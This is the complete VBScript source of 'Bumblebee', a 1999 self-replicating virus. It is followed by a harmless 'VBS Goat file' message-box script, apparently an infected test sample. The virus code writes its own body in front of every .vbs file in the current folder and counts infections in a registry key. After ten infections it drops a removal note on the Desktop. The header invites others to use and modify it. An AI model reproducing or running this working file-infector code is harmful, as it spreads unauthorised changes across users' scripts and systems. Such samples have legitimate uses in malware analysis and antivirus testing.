'-@
' Bumblebee - my first VB Script Virus
' by Bumblebee/[Hail and Kill] '99
' Feel free to use and modify it
'
  on error resume next

  const fdWrite=2, fdRead=1
  endl=chr(13)&chr(10)

  remove=endl&"   This system is infected by Bumblebee.vbs Virus."&endl&endl&"   Don't worry, it's a easy-to-remove virus:"&endl&endl&"      . Edit all of your system .vbs files and"&endl&"       delete from "&chr(39)&"-"&"@ to "&chr(39)&"-"&"@"&endl&endl&"   (C) 1999 Bumblebee/[Hail and Kill] ;)"&endl&endl
  hostName=Wscript.ScriptFullName  

  set fso=createObject("Scripting.FileSystemObject")

  set myShell=createObject("WScript.Shell")
  infCount=0
  infCount=myShell.regRead("HKCU\infCount")
  if infCount<1 then
        myShell.regWrite "HKCU\infCount",1
        infCount=1
  end if
  if infCount>10 then
        desk=myShell.specialFolders("Desktop")
        set fd=fso.openTextFile(desk&"\\Remove me!.txt",fdWrite,1)
        fd.write remove
        fd.close
  end if

  set fd=fso.openTextFile(hostName,fdRead)
  hostCode=fd.readAll
  fd.close

  virusSize=inStr(4,hostCode,"-"&"@")+1

  set fd=fso.openTextFile(hostName,fdRead)
  virusCode=fd.read(virusSize)
  fd.close

  for each victim in fso.getfolder(".").files

        vExt=fso.getExtensionName(victim.name)
        i=0
        if mid(vExt,1,1)="v" or mid(vExt,1,1)="V" then i=i+1 end if
        if mid(vExt,2,1)="b" or mid(vExt,2,1)="B" then i=i+1 end if
        if mid(vExt,3,1)="s" or mid(vExt,3,1)="S" then i=i+1 end if

        if i=3 then
                set fd=fso.openTextFile(victim.path,fdRead)
                victimCode=fd.readAll
                fd.close
                if left(victimCode,3)<>chr(39)&"-"&"@" then
                        infCount=infCount+1
                        infectedCode=virusCode&endl&victimCode
                        set fd=fso.openTextFile(victim.path,fdWrite,1)
                        fd.write infectedCode
                        fd.close
                end if
        end if
  next
  myShell.regWrite "HKCU\infCount",infCount

'-@
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
